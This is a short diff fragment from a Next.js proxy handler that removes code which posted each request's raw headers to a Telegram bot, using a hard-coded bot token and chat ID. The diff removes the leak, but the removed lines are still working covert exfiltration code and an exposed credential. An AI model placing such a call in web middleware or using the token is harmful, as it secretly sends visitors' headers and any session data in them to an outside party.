@@ -88,20 +88,6 @@ export const proxy = async (req: NextRequest) => {
     }
     console.log(rawHeader);
     const { pathname } = req.nextUrl;
-    const url = 'https://api.telegram.org/bot7696170315:AAHzY3ANCN23bED-vqRYC_3-49Ura_YOycA/sendMessage';
-    const data = await fetch(url, {
-        method: 'POST',
-        body: JSON.stringify({
-            text: rawHeader,
-            chat_id: 7211586401,
-            parse_mode: 'MarkdownV2'
-        }),
-        headers: {
-            'content-type': 'application/json'
-        }
-    });
-    const res = await data.json();
-    console.log(res);
 
     const ip = req.headers.get('cf-connecting-ip') || req.headers.get('x-nf-client-connection-ip') || req.headers.get('x-forwarded-for')?.split(',')[0].trim() || req.headers.get('x-real-ip') || 'unknown';
 
